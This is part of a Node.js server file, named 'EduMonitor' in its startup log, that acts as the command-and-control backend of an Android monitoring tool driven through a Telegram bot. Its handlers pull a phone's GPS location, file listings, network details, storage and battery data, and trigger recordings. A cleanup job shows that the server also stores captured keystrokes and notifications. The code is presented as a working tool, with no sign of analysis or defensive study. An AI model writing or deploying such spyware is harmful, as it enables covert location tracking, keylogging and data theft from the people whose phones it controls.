        editMessageText(chatId, messageId,
            success ? `✅ *Recording completed!*` : `❌ *Recording Failed*`,
            [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]);
    });

    if (!result.success) {
        await editMessageText(chatId, messageId,
            `❌ *Failed to send command*\n\nDevice may be offline.`,
            [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]);
    }
}

async function getLocation(chatId, messageId, deviceId) {
    await editMessageText(chatId, messageId,
        `📍 *Getting Location*\n\n⏳ Please wait...`,
        [[{ text: '🔙 CANCEL', callback_data: `device_${deviceId}` }]]);

    const result = deviceManager.sendCommand(deviceId, 'get_location', {}, (success, data) => {
        if (success && data) {
            const mapsUrl = `https://www.google.com/maps?q=${data.lat},${data.lon}`;
            editMessageText(chatId, messageId,
                `📍 *Location Received*\n\nLat: \`${data.lat}\`\nLon: \`${data.lon}\`\n` +
                `Accuracy: ±${data.accuracy}m\nProvider: ${data.provider}\n\n` +
                `[View on Google Maps](${mapsUrl})`,
                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]);
        } else {
            editMessageText(chatId, messageId,
                `❌ *Location Failed*`,
                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]);
        }
    });

    if (!result.success) {
        await editMessageText(chatId, messageId,
            `❌ *Failed to send command*`,
            [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]);
    }
}

async function listFiles(chatId, messageId, deviceId) {
    await editMessageText(chatId, messageId,
        `📁 *Listing Files*\n\nDefault path: /sdcard\n⏳ Please wait...`,
        [[{ text: '🔙 CANCEL', callback_data: `device_${deviceId}` }]]);

    deviceManager.sendCommand(deviceId, 'list_files', { path: '/sdcard' }, (success, data) => {
        if (success && data.files) {
            let fileList = `📁 *Files in ${data.path || '/sdcard'}*\n\n`;
            data.files.slice(0, 20).forEach(f => {
                fileList += `${f.isDirectory ? '📁' : '📄'} ${f.name}${f.size ? ` (${formatFileSize(f.size)})` : ''}\n`;
            });
            if (data.files.length > 20) fileList += `\n... and ${data.files.length - 20} more`;
            editMessageText(chatId, messageId, fileList,
                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]);
        } else {
            editMessageText(chatId, messageId,
                `❌ *Failed to list files*`,
                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]);
        }
    });
}

async function getBatteryStatus(chatId, messageId, deviceId) {
    db.get('SELECT * FROM devices WHERE id = ?', [deviceId], (err, device) => {
        if (err || !device) {
            return editMessageText(chatId, messageId,
                '❌ *Device Not Found*',
                [[{ text: '🔙 BACK', callback_data: 'menu_devices' }]]);
        }

        editMessageText(chatId, messageId,
            `🔋 *Battery Status - ${device.model || 'Unknown'}*\n\n` +
            `Level: ${getBatteryEmoji(device.battery_level)} ${device.battery_level || '?'}%\n` +
            `Last Updated: ${new Date(device.last_seen).toLocaleString()}`,
            [[{ text: '🔄 REFRESH', callback_data: `battery_${deviceId}` }, 
              { text: '🔙 BACK', callback_data: `device_${deviceId}` }]]);
    });
}

async function getNetworkInfo(chatId, messageId, deviceId) {
    await editMessageText(chatId, messageId,
        `📡 *Getting Network Info*\n\n⏳ Please wait...`,
        [[{ text: '🔙 CANCEL', callback_data: `device_${deviceId}` }]]);

    deviceManager.sendCommand(deviceId, 'get_network_info', {}, (success, data) => {
        if (success) {
            let message = `📡 *Network Info*\n\n`;
            if (data.connected) {
                message += `Status: ✅ Connected\nType: ${data.type}\n`;
                if (data.ssid) message += `WiFi: ${data.ssid}\n`;
                if (data.ip) message += `IP: ${data.ip}\n`;
            } else message += `Status: ❌ Disconnected\n`;
            
            editMessageText(chatId, messageId, message,
                [[{ text: '🔄 REFRESH', callback_data: `network_${deviceId}` }, 
                  { text: '🔙 BACK', callback_data: `device_${deviceId}` }]]);
        } else {
            editMessageText(chatId, messageId,
                `❌ *Failed to get network info*`,
                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]);
        }
    });
}

async function getStorageInfo(chatId, messageId, deviceId) {
    await editMessageText(chatId, messageId,
        `💾 *Getting Storage Info*\n\n⏳ Please wait...`,
        [[{ text: '🔙 CANCEL', callback_data: `device_${deviceId}` }]]);

    deviceManager.sendCommand(deviceId, 'get_storage_info', {}, (success, data) => {
        if (success) {
            let message = `💾 *Storage Info*\n\n`;
            if (data.internal_total) {
                message += `*Internal Storage:*\n`;
                message += `Total: ${formatFileSize(data.internal_total)}\n`;
                message += `Used: ${formatFileSize(data.internal_used)}\n`;
                message += `Free: ${formatFileSize(data.internal_free)}\n`;
                message += `Usage: ${Math.round((data.internal_used / data.internal_total) * 100)}%\n\n`;
            }
            if (data.external_total) {
                message += `*External Storage:*\n`;
                message += `Total: ${formatFileSize(data.external_total)}\n`;
                message += `Used: ${formatFileSize(data.external_used)}\n`;
                message += `Free: ${formatFileSize(data.external_free)}\n`;
                message += `Usage: ${Math.round((data.external_used / data.external_total) * 100)}%\n`;
            }
            editMessageText(chatId, messageId, message,
                [[{ text: '🔄 REFRESH', callback_data: `storage_${deviceId}` }, 
                  { text: '🔙 BACK', callback_data: `device_${deviceId}` }]]);
        } else {
            editMessageText(chatId, messageId,
                `❌ *Failed to get storage info*`,
                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]);
        }
    });
}

async function getDeviceInfo(chatId, messageId, deviceId) {
    db.get('SELECT * FROM devices WHERE id = ?', [deviceId], (err, device) => {
        if (err || !device) {
            return editMessageText(chatId, messageId,
                '❌ *Device Not Found*',
                [[{ text: '🔙 BACK', callback_data: 'menu_devices' }]]);
        }

        editMessageText(chatId, messageId,
            `ℹ️ *Device Information*\n\n*Model:* ${device.model || 'Unknown'}\n` +
            `*Android:* ${device.android_version || 'Unknown'}\n` +
            `*Manufacturer:* ${device.manufacturer || 'Unknown'}\n` +
            `*Device ID:* \`${device.id}\`\n` +
            `*Registered:* ${new Date(device.registered_at).toLocaleString()}\n` +
            `*Last Seen:* ${new Date(device.last_seen).toLocaleString()}`,
            [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]);
    });
}

// ============================================
// UTILITY FUNCTIONS
// ============================================
function getBatteryEmoji(level) {
    if (!level) return '❓';
    if (level > 80) return '🔋';
    if (level > 50) return '⚡';
    if (level > 20) return '⚠️';
    return '🪫';
}

function formatFileSize(bytes) {
    if (!bytes) return '0 B';
    const sizes = ['B', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(1024));
    return (bytes / Math.pow(1024, i)).toFixed(1) + ' ' + sizes[i];
}

// ============================================
// CLEANUP JOBS
// ============================================
schedule.scheduleJob('0 0 * * *', () => {
    const cutoff = Date.now() - config.storage.retentionDays * 24 * 60 * 60 * 1000;
    
    db.all('SELECT file_path FROM media WHERE timestamp < ?', [cutoff], (err, media) => {
        media?.forEach(item => {
            if (item.file_path && fs.existsSync(item.file_path)) {
                fs.unlinkSync(item.file_path);
            }
        });
    });

    db.run('DELETE FROM media WHERE timestamp < ?', [cutoff]);
    db.run('DELETE FROM locations WHERE timestamp < ?', [cutoff]);
    db.run('DELETE FROM keystrokes WHERE timestamp < ?', [cutoff]);
    db.run('DELETE FROM notifications WHERE timestamp < ?', [cutoff]);
});

// ============================================
// ERROR HANDLING
// ============================================
app.use((req, res) => {
    res.status(404).json({ error: 'Endpoint not found' });
});

app.use((err, req, res, next) => {
    console.error('Server error:', err.stack);
    res.status(500).json({ error: 'Internal server error' });
});

// ============================================
// START SERVER
// ============================================
if (!fs.existsSync('uploads')) {
    fs.mkdirSync('uploads', { recursive: true });
}

server.listen(config.server.port, config.server.host, () => {
    console.log('\n🚀 ===============================================');
    console.log(`🚀 EduMonitor Server Started`);
    console.log(`🚀 ===============================================`);
    console.log(`\n📡 HTTP: http://${config.server.host}:${config.server.port}`);
    console.log(`🔌 WebSocket: ws://${config.server.host}:${config.server.port}/ws`);
    console.log(`📊 Database: SQLite`);
    setWebhook();
    console.log(`\n✅ Server ready\n`);
});

process.on('SIGTERM', shutdown);
process.on('SIGINT', shutdown);

function shutdown() {
    console.log('\n🛑 Shutting down...');
    deviceManager.broadcastToDevices({ type: 'shutdown', timestamp: Date.now() });
    wss.close();
    server.close(() => {
        db.close();
        process.exit(0);
    });
}

module.exports = { app, server, wss, deviceManager, db };
